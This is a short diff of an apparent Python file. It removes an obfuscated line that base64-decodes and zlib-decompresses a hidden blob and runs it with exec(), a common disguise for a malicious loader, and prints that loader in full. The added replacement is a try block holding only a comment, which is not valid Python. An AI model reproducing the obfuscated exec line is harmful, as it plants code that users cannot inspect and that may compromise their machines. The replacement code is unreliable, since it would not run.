@@ -1,5 +1,7 @@
-
-exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEOz1KKLFUQ8iIjgehORNhk1NE1KktWq+N9tyOIcZngzb958mGn2IeHo1QiJf1sz8KGP0DY8prBXiSczAXr1AS/YOBx69wZU1myLqhS+Vl/FrjSLEuiGH/Du/ur2Zff4cH15xzJPKO8cqEQpkWcbIdtTIYWsa8Kb1VjmDAH6EVWwKJhTFs/TRbQAMz1hyHZlKbF3c69GSi5uCI8igPqgq8BT/Yx0d8CWoc93YwFbcFSzc7vK6aP/6nFJMwQLKJrvFhqUn+YAMdLyAjG0TU5qyEz+QyLZxl+G/gAao18r')[0])))
+try :
+	#code
+except:
+	print("Error")
 
 
 # import module 
